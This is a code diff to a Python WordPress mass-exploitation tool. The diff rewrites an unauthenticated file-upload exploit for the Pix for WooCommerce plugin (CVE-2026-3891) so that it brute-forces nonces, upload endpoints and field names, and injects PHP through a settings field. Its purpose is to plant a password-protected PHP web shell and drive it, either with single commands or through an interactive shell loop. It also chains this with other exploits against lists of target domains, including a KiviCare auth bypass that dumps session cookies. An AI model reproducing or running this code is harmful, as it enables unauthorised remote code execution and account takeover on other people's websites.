@@ -394,6 +394,363 @@ class WPFileManagerExploit:
             pass
         return False, None
     
+    def extract_shell_url(self, response, base_url):
+        """Extract shell URL from response text"""
+        try:
+            # Try JSON response
+            json_data = response.json()
+            if isinstance(json_data, dict):
+                url_candidates = [
+                    json_data.get("url"),
+                    json_data.get("file_url"),
+                    json_data.get("path"),
+                    json_data.get("data", {}).get("url"),
+                    json_data.get("data", {}).get("file_url"),
+                ]
+                for candidate in url_candidates:
+                    if candidate and ".php" in candidate:
+                        if candidate.startswith("http"):
+                            return candidate
+                        else:
+                            return urljoin(base_url, candidate)
+        except:
+            pass
+        
+        # Try regex extraction
+        url_patterns = [
+            r'(https?://[^\s"\'<>]+\.php)',
+            r'/[^\s"\'<>]+\.php',
+            r'wp-content/[^\s"\'<>]+\.php',
+        ]
+        
+        for pattern in url_patterns:
+            match = re.search(pattern, response.text)
+            if match:
+                url = match.group(1) if pattern.startswith('http') else urljoin(base_url, match.group(0))
+                return url
+        
+        return None
+    
+    def exploit_pix_woocommerce_rce(self, target_url, command=None, interactive=False):
+        """
+        CVE-2026-3891 — Pix for WooCommerce <= 1.5.0 - Unauthenticated Arbitrary File Upload
+        Author: Joshua van der Poll
+        """
+        print(f"\n  {CYAN}[*]{RESET} Testing Pix for WooCommerce RCE (CVE-2026-3891)...")
+        
+        base_url = target_url.rstrip("/")
+        
+        # Try multiple possible shell paths
+        possible_shell_paths = [
+            "wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/shell.php",
+            "wp-content/plugins/pix-for-woocommerce/Includes/files/certs_c6/shell.php",
+            "wp-content/plugins/woocommerce-pix/Includes/files/certs_c6/shell.php",
+            "wp-content/uploads/shell.php",
+            "shell.php",
+        ]
+        
+        # Try multiple AJAX endpoints
+        ajax_endpoints = [
+            f"{base_url}/wp-admin/admin-ajax.php",
+            f"{base_url}/wp-admin/admin-ajax.php?action=lkn_pix_for_woocommerce_generate_nonce",
+            f"{base_url}/wp-json/pix/v1/nonce",
+        ]
+        
+        # Step 1: Try to get nonce from multiple endpoints
+        nonce = None
+        nonce_obtained = False
+        
+        for endpoint in ajax_endpoints:
+            if nonce_obtained:
+                break
+                
+            print(f"    {CYAN}[*]{RESET} Trying nonce endpoint: {endpoint}")
+            
+            try:
+                # Try different data formats
+                data_formats = [
+                    {"action": "lkn_pix_for_woocommerce_generate_nonce", "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce"},
+                    {"action": "pix_generate_nonce"},
+                    {"action": "woocommerce_pix_nonce"},
+                    {"action": "generate_nonce", "plugin": "pix"},
+                ]
+                
+                for data in data_formats:
+                    if nonce_obtained:
+                        break
+                        
+                    try:
+                        nonce_response = self.session.post(
+                            endpoint,
+                            data=data,
+                            timeout=10,
+                            headers={"X-Requested-With": "XMLHttpRequest"}
+                        )
+                        
+                        if nonce_response.status_code == 200 and nonce_response.text:
+                            # Try to parse JSON
+                            try:
+                                nonce_data = nonce_response.json()
+                                
+                                # Handle different response formats
+                                if isinstance(nonce_data, dict):
+                                    # Try different paths to get nonce
+                                    nonce_candidates = [
+                                        nonce_data.get("data", {}).get("nonce"),
+                                        nonce_data.get("nonce"),
+                                        nonce_data.get("_nonce"),
+                                        nonce_data.get("security"),
+                                        nonce_data.get("ajax_nonce"),
+                                    ]
+                                    
+                                    for candidate in nonce_candidates:
+                                        if candidate and isinstance(candidate, str) and len(candidate) > 5:
+                                            nonce = candidate
+                                            nonce_obtained = True
+                                            print(f"    {GREEN}[+]{RESET} Nonce obtained from {endpoint}: {nonce[:20]}...")
+                                            break
+                            except:
+                                # Try to extract nonce from text response
+                                nonce_patterns = [
+                                    r'"nonce":"([^"]+)"',
+                                    r"'nonce':'([^']+)'",
+                                    r'nonce=([^&\s]+)',
+                                    r'"data":\{"nonce":"([^"]+)"\}',
+                                ]
+                                for pattern in nonce_patterns:
+                                    match = re.search(pattern, nonce_response.text)
+                                    if match:
+                                        nonce = match.group(1)
+                                        nonce_obtained = True
+                                        print(f"    {GREEN}[+]{RESET} Nonce extracted from text: {nonce[:20]}...")
+                                        break
+                    except:
+                        continue
+                        
+            except Exception as e:
+                continue
+        
+        # If no nonce found, try to upload without nonce or use default
+        if not nonce_obtained:
+            print(f"    {YELLOW}[!]{RESET} Could not obtain nonce, trying alternative methods...")
+            # Try common nonce values (sometimes plugins have hardcoded or predictable nonces)
+            common_nonces = [
+                "pix_woocommerce_nonce",
+                "pix_nonce",
+                "woocommerce_pix_nonce",
+                "admin_ajax_nonce",
+                "1",
+                "0",
+            ]
+            
+            for test_nonce in common_nonces:
+                print(f"    {CYAN}[*]{RESET} Trying common nonce: {test_nonce}")
+                # Test if this nonce works by attempting a dummy request
+                test_data = {
+                    "action": "lkn_pix_for_woocommerce_c6_save_settings",
+                    "_ajax_nonce": test_nonce,
+                    "settings": json.dumps({"enabled": "yes"}),
+                }
+                
+                try:
+                    test_response = self.session.post(
+                        f"{base_url}/wp-admin/admin-ajax.php",
+                        data=test_data,
+                        timeout=5
+                    )
+                    if test_response.status_code != 400:  # Not a bad request, might work
+                        nonce = test_nonce
+                        print(f"    {GREEN}[+]{RESET} Using nonce: {nonce}")
+                        break
+                except:
+                    continue
+            
+            if not nonce:
+                print(f"    {RED}[-]{RESET} Could not obtain valid nonce")
+                return False, "Failed to obtain nonce"
+        
+        # Step 2: Try multiple upload endpoints
+        upload_endpoints = [
+            f"{base_url}/wp-admin/admin-ajax.php",
+            f"{base_url}/wp-json/pix/v1/upload",
+            f"{base_url}/wp-content/plugins/payment-gateway-pix-for-woocommerce/upload.php",
+            f"{base_url}/wp-content/plugins/pix-for-woocommerce/upload.php",
+        ]
+        
+        upload_success = False
+        shell_url = None
+        
+        for endpoint in upload_endpoints:
+            if upload_success:
+                break
+                
+            print(f"    {CYAN}[*]{RESET} Trying upload endpoint: {endpoint}")
+            
+            with tempfile.NamedTemporaryFile(suffix=".php", delete=False) as tmp:
+                tmp.write(PIX_SHELL)
+                tmp_path = tmp.name
+            
+            try:
+                # Try different file field names
+                file_fields = [
+                    "certificate_crt_path",
+                    "file",
+                    "upload_file",
+                    "pix_certificate",
+                    "certificate",
+                    "fileToUpload",
+                ]
+                
+                for file_field in file_fields:
+                    if upload_success:
+                        break
+                        
+                    data = {
+                        "action": "lkn_pix_for_woocommerce_c6_save_settings",
+                        "_ajax_nonce": nonce,
+                        "settings": json.dumps({"enabled": "yes", "title": "PIX C6", "pix_expiration_minutes": 30}),
+                    }
+                    
+                    with open(tmp_path, "rb") as f:
+                        files = {
+                            file_field: ("shell.php", f, "application/octet-stream"),
+                        }
+                        
+                        try:
+                            upload_response = self.session.post(
+                                endpoint,
+                                data=data,
+                                files=files,
+                                timeout=30,
+                                headers={"X-Requested-With": "XMLHttpRequest"}
+                            )
+                            
+                            if upload_response.status_code == 200:
+                                print(f"    {GREEN}[+]{RESET} Upload successful using field: {file_field}")
+                                upload_success = True
+                                
+                                # Try to find shell URL from response
+                                shell_url = self.extract_shell_url(upload_response, base_url)
+                                if not shell_url:
+                                    # Try common paths
+                                    for path in possible_shell_paths:
+                                        test_url = f"{base_url}/{path}"
+                                        test_resp = self.session.get(test_url, timeout=5)
+                                        if test_resp.status_code == 200:
+                                            shell_url = test_url
+                                            break
+                                break
+                        except:
+                            continue
+                            
+            finally:
+                os.unlink(tmp_path)
+        
+        if not upload_success:
+            # Try direct file write as last resort (if the plugin has file write vulnerability)
+            print(f"    {CYAN}[*]{RESET} Trying direct file write method...")
+            
+            direct_write_payload = f"""<?php
+$p = "{SHELL_PASSWORD}";
+if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
+    if(isset($_REQUEST['cmd'])){{ system($_REQUEST['cmd']); die; }}
+}}
+file_put_contents("shell.php", "<?php \\$p='{SHELL_PASSWORD}'; if(isset(\\$_REQUEST[\\'p\\']) && \\$_REQUEST[\\'p\\']===\\$p && isset(\\$_REQUEST[\\'cmd\\'])){{ system(\\$_REQUEST[\\'cmd\\']); die; }} ?>");
+echo "Shell created";
+?>"""
+            
+            try:
+                # Try to inject via settings parameter
+                inject_data = {
+                    "action": "lkn_pix_for_woocommerce_c6_save_settings",
+                    "_ajax_nonce": nonce,
+                    "settings": json.dumps({
+                        "enabled": "yes",
+                        "title": f"PIX C6 <?php file_put_contents('shell.php', '<?php \\$p=\"{SHELL_PASSWORD}\"; if(isset(\\$_REQUEST[\\'p\\']) && \\$_REQUEST[\\'p\\']===\\$p && isset(\\$_REQUEST[\\'cmd\\'])){{ system(\\$_REQUEST[\\'cmd\\']); die; }} ?>'); ?>",
+                        "pix_expiration_minutes": 30
+                    }),
+                }
+                
+                inject_response = self.session.post(
+                    f"{base_url}/wp-admin/admin-ajax.php",
+                    data=inject_data,
+                    timeout=30,
+                    headers={"X-Requested-With": "XMLHttpRequest"}
+                )
+                
+                if inject_response.status_code == 200:
+                    # Check if shell was created
+                    for path in possible_shell_paths:
+                        test_url = f"{base_url}/{path}"
+                        test_resp = self.session.get(test_url, timeout=5)
+                        if test_resp.status_code == 200:
+                            shell_url = test_url
+                            upload_success = True
+                            print(f"    {GREEN}[+]{RESET} Shell created via direct write!")
+                            break
+            except:
+                pass
+        
+        if not upload_success:
+            print(f"    {RED}[-]{RESET} All upload methods failed")
+            return False, "No working upload method found"
+        
+        if not shell_url:
+            # Default shell location
+            shell_url = f"{base_url}/wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/shell.php"
+        
+        # Step 3: Verify and use shell
+        print(f"    {CYAN}[*]{RESET} Verifying shell at: {shell_url}")
+        verify_response = self.session.get(shell_url, timeout=10)
+        
+        if verify_response.status_code == 200:
+            print(f"    {GREEN}[+]{RESET} Shell is accessible!")
+            
+            test_response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd=echo%20test", timeout=10)
+            if test_response.status_code == 200 and "test" in test_response.text:
+                print(f"    {GREEN}[SHELL]{RESET} Pix shell active: {shell_url}?p={SHELL_PASSWORD}")
+                
+                if command:
+                    print(f"    {CYAN}[*]{RESET} Running command: {command}")
+                    cmd_response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd={command}", timeout=10)
+                    if cmd_response.status_code == 200 and cmd_response.text.strip():
+                        print(f"\n    {GREEN}[OUTPUT]{RESET}\n{cmd_response.text.strip()}\n")
+                
+                if interactive:
+                    self.interactive_pix_shell(shell_url)
+                
+                return True, f"Pix Shell: {shell_url}?p={SHELL_PASSWORD}"
+            else:
+                print(f"    {YELLOW}[!]{RESET} Shell uploaded but command execution failed")
+                return True, f"Pix payload uploaded: {shell_url}?p={SHELL_PASSWORD}"
+        else:
+            print(f"    {RED}[-]{RESET} Shell not accessible (HTTP {verify_response.status_code})")
+            return False, "Shell upload failed verification"
+    
+    def interactive_pix_shell(self, shell_url):
+        """Interactive shell for Pix for WooCommerce"""
+        print(f"\n  {GREEN}[+]{RESET} Entering interactive shell mode...")
+        print(f"  {YELLOW}[!]{RESET} Type 'exit' or Ctrl+C to quit\n")
+        
+        try:
+            while True:
+                cmd = input(f"  {PINK}shell>{RESET} ").strip()
+                if not cmd:
+                    continue
+                if cmd.lower() in ('exit', 'quit'):
+                    break
+                
+                try:
+                    response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd={cmd}", timeout=10)
+                    if response.status_code == 200 and response.text.strip():
+                        print(response.text.strip())
+                    else:
+                        print(f"  {YELLOW}[!]{RESET} No output or command failed")
+                except Exception as e:
+                    print(f"  {RED}[-]{RESET} Error: {str(e)}")
+        except KeyboardInterrupt:
+            print(f"\n  {YELLOW}[!]{RESET} Exiting interactive shell")
+    
     def detect_mpmf_endpoint_and_form(self, target_url):
         """
         Detect MPMF endpoint and form name automatically
@@ -430,7 +787,6 @@ class WPFileManagerExploit:
             try:
                 resp = self.session.get(test_url, timeout=5)
                 if resp.status_code == 200:
-                    # Check if this looks like an MPMF form
                     if 'mpmf' in resp.text.lower() or 'form_name' in resp.text:
                         found_endpoint = test_url
                         print(f"    {GREEN}[+]{RESET} Found MPMF endpoint: {found_endpoint}")
@@ -438,9 +794,7 @@ class WPFileManagerExploit:
             except:
                 continue
         
-        # If no endpoint found, try to find any page with MPMF indicators
         if not found_endpoint:
-            # Try to find MPMF forms on the main page or common pages
             pages_to_check = [
                 base_url,
                 urljoin(base_url, '/'),
@@ -452,7 +806,6 @@ class WPFileManagerExploit:
                 try:
                     resp = self.session.get(page, timeout=5)
                     if resp.status_code == 200 and 'mpmf' in resp.text.lower():
-                        # Look for form action URL
                         action_match = re.search(r'<form[^>]+action="([^"]+)"', resp.text)
                         if action_match:
                             found_endpoint = action_match.group(1)
@@ -461,7 +814,6 @@ class WPFileManagerExploit:
                 except:
                     continue
         
-        # Now detect form name
         if found_endpoint:
             try:
                 resp = self.session.get(found_endpoint, timeout=5)
@@ -475,11 +827,10 @@ class WPFileManagerExploit:
             except:
                 pass
         
-        # If still no form name, try common values
         if not found_form_name:
             common_forms = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload', 'default', 'mpmf']
-            for fname in common_forms:
-                if found_endpoint:
+            if found_endpoint:
+                for fname in common_forms:
                     test_url = f"{found_endpoint}?form_name={fname}"
                     try:
                         resp = self.session.get(test_url, timeout=5)
@@ -501,9 +852,8 @@ class WPFileManagerExploit:
         
         base_url = target_url.rstrip("/")
         endpoint = "/wp-json/kivicare/v1/auth/patient/social-login"
-        fake_token = "A" * 40  # Fake OAuth token
+        fake_token = "A" * 40
         
-        # Check if KiviCare is installed
         try:
             check_resp = self.session.get(f"{base_url}/wp-json/kivicare/v1/", timeout=5)
             if check_resp.status_code >= 500:
@@ -546,14 +896,12 @@ class WPFileManagerExploit:
                         print(f"    {CYAN}[*]{RESET} Email: {data.get('user_email', 'N/A')}")
                         print(f"    {CYAN}[*]{RESET} Roles: {', '.join(data.get('roles', []))}")
                         
-                        # Show cookies
                         cookies = {c.name: c.value for c in response.cookies}
                         if cookies:
                             print(f"    {GREEN}[+]{RESET} Auth cookies obtained!")
                             for name, value in cookies.items():
                                 print(f"        {YELLOW}{name}{RESET} = {value[:50]}...")
                             
-                            # Generate console snippet
                             print(f"\n    {YELLOW}[!]{RESET} Browser console snippet:")
                             print(f"    {GREY}// Paste in browser console on {base_url}{RESET}")
                             for name, value in cookies.items():
@@ -591,152 +939,18 @@ class WPFileManagerExploit:
             print(f"    {RED}[-]{RESET} KiviCare exploit error: {str(e)}")
             return False, f"Error: {str(e)}"
     
-    def exploit_pix_woocommerce_rce(self, target_url, command=None, interactive=False):
-        """
-        CVE-2026-3891 — Pix for WooCommerce <= 1.5.0 - Unauthenticated Arbitrary File Upload
-        Author: Joshua van der Poll
-        """
-        print(f"\n  {CYAN}[*]{RESET} Testing Pix for WooCommerce RCE (CVE-2026-3891)...")
-        
-        base_url = target_url.rstrip("/")
-        shell_name = "shell.php"
-        shell_path = f"wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/{shell_name}"
-        shell_url = f"{base_url}/{shell_path}"
-        
-        try:
-            # Step 1: Get nonce
-            print(f"    {CYAN}[*]{RESET} Fetching nonce...")
-            nonce_response = self.session.post(
-                f"{base_url}/wp-admin/admin-ajax.php",
-                data={
-                    "action": "lkn_pix_for_woocommerce_generate_nonce",
-                    "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce",
-                },
-                timeout=10,
-            )
-            
-            try:
-                nonce_data = nonce_response.json()
-                if not nonce_data.get("success"):
-                    print(f"    {RED}[-]{RESET} Nonce request failed: {nonce_data}")
-                    return False, "Failed to get nonce"
-                nonce = nonce_data["data"]["nonce"]
-                print(f"    {GREEN}[+]{RESET} Nonce obtained: {nonce}")
-            except Exception as e:
-                print(f"    {RED}[-]{RESET} Failed to parse nonce response: {str(e)}")
-                return False, f"Nonce error: {str(e)}"
-            
-            # Step 2: Upload shell
-            print(f"    {CYAN}[*]{RESET} Uploading shell...")
-            
-            with tempfile.NamedTemporaryFile(suffix=".php", delete=False) as tmp:
-                tmp.write(PIX_SHELL)
-                tmp_path = tmp.name
-            
-            try:
-                data = {
-                    "action": "lkn_pix_for_woocommerce_c6_save_settings",
-                    "_ajax_nonce": nonce,
-                    "settings": json.dumps({"enabled": "yes", "title": "PIX C6", "pix_expiration_minutes": 30}),
-                }
-                
-                with open(tmp_path, "rb") as f:
-                    files = {
-                        "certificate_crt_path": (shell_name, f, "application/octet-stream"),
-                    }
-                    
-                    upload_response = self.session.post(
-                        f"{base_url}/wp-admin/admin-ajax.php",
-                        data=data,
-                        files=files,
-                        timeout=30,
-                    )
-                
-                try:
-                    upload_data = upload_response.json()
-                    if not upload_data.get("success"):
-                        print(f"    {RED}[-]{RESET} Upload failed: {upload_data}")
-                        return False, "Upload failed"
-                except:
-                    pass
-                
-                print(f"    {GREEN}[+]{RESET} Shell uploaded successfully!")
-                print(f"    {CYAN}[*]{RESET} Shell URL: {shell_url}")
-                print(f"    {YELLOW}[!]{RESET} Password: {SHELL_PASSWORD}")
-                
-            finally:
-                os.unlink(tmp_path)
-            
-            # Step 3: Verify shell
-            print(f"    {CYAN}[*]{RESET} Verifying shell...")
-            verify_response = self.session.get(shell_url, timeout=10)
-            
-            if verify_response.status_code == 200:
-                print(f"    {GREEN}[+]{RESET} Shell is accessible!")
-                
-                test_response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd=echo%20test")
-                if test_response.status_code == 200 and "test" in test_response.text:
-                    print(f"    {GREEN}[SHELL]{RESET} Pix shell active: {shell_url}?p={SHELL_PASSWORD}")
-                    
-                    if command:
-                        print(f"    {CYAN}[*]{RESET} Running command: {command}")
-                        cmd_response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd={command}", timeout=10)
-                        if cmd_response.status_code == 200 and cmd_response.text.strip():
-                            print(f"\n    {GREEN}[OUTPUT]{RESET}\n{cmd_response.text.strip()}\n")
-                    
-                    if interactive:
-                        self.interactive_pix_shell(shell_url)
-                    
-                    return True, f"Pix Shell: {shell_url}?p={SHELL_PASSWORD}"
-                else:
-                    print(f"    {YELLOW}[!]{RESET} Shell uploaded but command execution failed")
-                    return True, f"Pix payload uploaded: {shell_url}?p={SHELL_PASSWORD}"
-            else:
-                print(f"    {RED}[-]{RESET} Shell not accessible (HTTP {verify_response.status_code})")
-                return False, "Shell upload failed verification"
-                
-        except Exception as e:
-            print(f"    {RED}[-]{RESET} Pix exploit error: {str(e)}")
-            return False, f"Error: {str(e)}"
-    
-    def interactive_pix_shell(self, shell_url):
-        """Interactive shell for Pix for WooCommerce"""
-        print(f"\n  {GREEN}[+]{RESET} Entering interactive shell mode...")
-        print(f"  {YELLOW}[!]{RESET} Type 'exit' or Ctrl+C to quit\n")
-        
-        try:
-            while True:
-                cmd = input(f"  {PINK}shell>{RESET} ").strip()
-                if not cmd:
-                    continue
-                if cmd.lower() in ('exit', 'quit'):
-                    break
-                
-                try:
-                    response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd={cmd}", timeout=10)
-                    if response.status_code == 200 and response.text.strip():
-                        print(response.text.strip())
-                    else:
-                        print(f"  {YELLOW}[!]{RESET} No output or command failed")
-                except Exception as e:
-                    print(f"  {RED}[-]{RESET} Error: {str(e)}")
-        except KeyboardInterrupt:
-            print(f"\n  {YELLOW}[!]{RESET} Exiting interactive shell")
-    
     def exploit_mpmf_rce(self, target_url, form_name=None):
         """
         CVE-2024-50526: Multi-Purpose Multi-Forms (mpmf) Unauthenticated RCE
         """
         print(f"\n  {CYAN}[*]{RESET} Testing MPMF RCE (CVE-2024-50526)...")
         
-        # Auto-detect endpoint and form name if not provided
         endpoint_url = None
         if not form_name:
             endpoint_url, detected_form = self.detect_mpmf_endpoint_and_form(target_url)
             if detected_form:
                 form_name = detected_form
         
-        # If still no endpoint, try common paths
         if not endpoint_url:
             base_url = target_url.rstrip('/')
             common_endpoints = [
@@ -759,7 +973,6 @@ class WPFileManagerExploit:
             print(f"    {RED}[-]{RESET} Could not find MPMF endpoint")
             return False, "MPMF endpoint not found"
         
-        # If still no form name, try to detect from endpoint
         if not form_name:
             try:
                 resp = self.session.get(endpoint_url, timeout=5)
@@ -778,12 +991,10 @@ class WPFileManagerExploit:
             except:
                 pass
         
-        # Last resort: try common form names
         if not form_name:
             common_forms = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload', 'default']
             for fname in common_forms:
                 print(f"    {CYAN}[*]{RESET} Trying form name: {fname}")
-                # Test if this form name works by checking if the page loads
                 test_url = f"{endpoint_url}?form_name={fname}"
                 try:
                     resp = self.session.get(test_url, timeout=5)
@@ -851,7 +1062,6 @@ if (isset($_GET['cmd'])) {{
             if response.status_code == 200:
                 print(f"    {GREEN}[+]{RESET} File upload successful!")
                 
-                # Determine base URL for uploads
                 base_parts = target_url.split('/wp-content/')
                 if len(base_parts) > 1:
                     base_url = base_parts[0] + '/'
@@ -1256,14 +1466,12 @@ if (isset($_GET['cmd'])) {{
             'details': []
         }
         
-        # Test KiviCare Auth Bypass (CVE-2026-2991)
         if kivicare_email:
             print(f"{CYAN}[*]{RESET} Testing KiviCare Auth Bypass (CVE-2026-2991)...")
             kivicare_result, kivicare_msg = self.exploit_kivicare_auth_bypass(target_url, kivicare_email, kivicare_login_type)
             results['kivicare_bypass'] = kivicare_result
             results['details'].append(f"[KiviCare] {kivicare_msg}")
         
-        # Test Pix for WooCommerce RCE (CVE-2026-3891)
         print(f"{CYAN}[*]{RESET} Testing Pix for WooCommerce RCE (CVE-2026-3891)...")
         pix_result, pix_msg = self.exploit_pix_woocommerce_rce(target_url, pix_command, pix_interactive)
         results['pix_rce'] = pix_result
@@ -1273,7 +1481,6 @@ if (isset($_GET['cmd'])) {{
             if shell_part not in results['shell_urls']:
                 results['shell_urls'].append(shell_part)
         
-        # Test MPMF RCE (CVE-2024-50526)
         print(f"{CYAN}[*]{RESET} Testing MPMF RCE (CVE-2024-50526)...")
         mpmf_result, mpmf_msg = self.exploit_mpmf_rce(target_url, mpmf_form_name)
         results['mpmf_rce'] = mpmf_result
@@ -1283,7 +1490,6 @@ if (isset($_GET['cmd'])) {{
             if shell_part not in results['shell_urls']:
                 results['shell_urls'].append(shell_part)
         
-        # Test WooCommerce RCE (CVE-2024-51793)
         print(f"{CYAN}[*]{RESET} Testing WooCommerce RCE (CVE-2024-51793)...")
         woo_result, woo_msg = self.exploit_woocommerce_rce(target_url)
         results['woocommerce'] = woo_result
@@ -1293,7 +1499,6 @@ if (isset($_GET['cmd'])) {{
             if shell_part not in results['shell_urls']:
                 results['shell_urls'].append(shell_part)
         
-        # Test Elementor RCE if credentials provided
         if elementor_creds and elementor_creds.get('username') and elementor_creds.get('password'):
             print(f"{CYAN}[*]{RESET} Testing Elementor RCE (CVE-2022-1329)...")
             elementor_result, elementor_msg = self.exploit_elementor(
@@ -1309,7 +1514,6 @@ if (isset($_GET['cmd'])) {{
                 if shell_part not in results['shell_urls']:
                     results['shell_urls'].append(shell_part)
         
-        # Test CVE-2020-25213
         print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213...")
         cve_result, cve_msg = self.exploit_cve_2020_25213(target_url, auto_shell=True)
         results['cve_2020_25213'] = cve_result
@@ -1319,7 +1523,6 @@ if (isset($_GET['cmd'])) {{
             if shell_part not in results['shell_urls']:
                 results['shell_urls'].append(shell_part)
         
-        # Test admin-ajax RCE
         print(f"{CYAN}[*]{RESET} Testing admin-ajax.php RCE...")
         ajax_result, ajax_msg = self.exploit_admin_ajax_rce(target_url)
         results['admin_ajax_rce'] = ajax_result
@@ -1448,14 +1651,12 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None, interact
         if exploit:
             exploiter = WPFileManagerExploit()
             
-            # Try KiviCare Auth Bypass (CVE-2026-2991)
             if kivicare_email:
                 print(f"{CYAN}[*]{RESET} Testing KiviCare Auth Bypass...")
                 kivicare_success, kivicare_msg = exploiter.exploit_kivicare_auth_bypass(target_url, kivicare_email, kivicare_login_type)
                 if kivicare_success:
                     print(f"  {GREEN}[BYPASS]{RESET} {kivicare_msg}")
             
-            # Try Pix for WooCommerce RCE (CVE-2026-3891)
             print(f"{CYAN}[*]{RESET} Testing Pix for WooCommerce RCE...")
             pix_success, pix_msg = exploiter.exploit_pix_woocommerce_rce(target_url, pix_command, pix_interactive)
             if pix_success and "Shell" in pix_msg:
@@ -1464,7 +1665,6 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None, interact
                     result['shell_urls'].append(shell_url)
                 print(f"  {GREEN}[SHELL]{RESET} {pix_msg}")
             
-            # Try MPMF RCE (with auto-detection)
             print(f"{CYAN}[*]{RESET} Testing MPMF RCE...")
             mpmf_success, mpmf_msg = exploiter.exploit_mpmf_rce(target_url, mpmf_form_name)
             if mpmf_success and "Shell" in mpmf_msg:
@@ -1473,7 +1673,6 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None, interact
                     result['shell_urls'].append(shell_url)
                 print(f"  {GREEN}[SHELL]{RESET} {mpmf_msg}")
             
-            # Try WooCommerce RCE
             print(f"{CYAN}[*]{RESET} Testing WooCommerce RCE...")
             woo_success, woo_msg = exploiter.exploit_woocommerce_rce(target_url)
             if woo_success and "Shell" in woo_msg:
@@ -1482,7 +1681,6 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None, interact
                     result['shell_urls'].append(shell_url)
                 print(f"  {GREEN}[SHELL]{RESET} {woo_msg}")
             
-            # Try Elementor RCE if credentials provided
             if elementor_creds and elementor_creds.get('username') and elementor_creds.get('password'):
                 print(f"{CYAN}[*]{RESET} Testing Elementor RCE...")
                 elementor_success, elementor_msg = exploiter.exploit_elementor(
@@ -1497,7 +1695,6 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None, interact
                         result['shell_urls'].append(shell_url)
                     print(f"  {GREEN}[SHELL]{RESET} {elementor_msg}")
             
-            # Try other exploits
             exploit_result = exploiter.auto_exploit(target_url, elementor_creds, mpmf_form_name, pix_command, pix_interactive, kivicare_email, kivicare_login_type)
             result['exploit_results'] = exploit_result
             if isinstance(exploit_result, dict) and 'shell_urls' in exploit_result:
@@ -1662,7 +1859,6 @@ def main():
 
     kivicare_banner()
     
-    # Multi-target scan mode (default)
     filename = input(f"\n{YELLOW}[?]{RESET} Enter filename with domains/URLs: ").strip()
     
     if not os.path.exists(filename):
@@ -1686,7 +1882,6 @@ def main():
     exploit = exploit_input == 'y'
     interactive = False
     
-    # KiviCare email (optional)
     kivicare_email = None
     kivicare_login_type = "google"
     if exploit:
@@ -1698,7 +1893,6 @@ def main():
             if login_type in ['google', 'apple']:
                 kivicare_login_type = login_type
     
-    # Elementor credentials (optional)
     elementor_creds = None
     if exploit:
         print(f"\n{CYAN}[*]{RESET} Elementor RCE requires WordPress credentials")
@@ -1709,7 +1903,6 @@ def main():
             if username and password:
                 elementor_creds = {'username': username, 'password': password}
     
-    # MPMF form name (optional - will auto-detect if not provided)
     mpmf_form_name = None
     if exploit:
         mpmf_form_input = input(f"{YELLOW}[?]{RESET} Enter MPMF form name (or press Enter for auto-detect): ").strip()
@@ -1718,13 +1911,14 @@ def main():
         else:
             print(f"  {CYAN}[i]{RESET} MPMF form name will be auto-detected")
     
-    # Pix command (optional)
     pix_command = None
     pix_interactive = False
     if exploit:
-        pix_cmd_input = input(f"{YELLOW}[?]{RESET} Enter command to run on Pix shell (or press Enter to skip): ").strip()
+        pix_cmd_input = input(f"{YELLOW}[?]{RESET} Enter command to run on Pix shell (or press Enter for interactive): ").strip()
         if pix_cmd_input:
             pix_command = pix_cmd_input
+        else:
+            pix_interactive = True
     
     print(f"{BLUE}[*]{RESET} Starting scan with {CYAN}{max_workers}{RESET} threads...")
     if exploit:
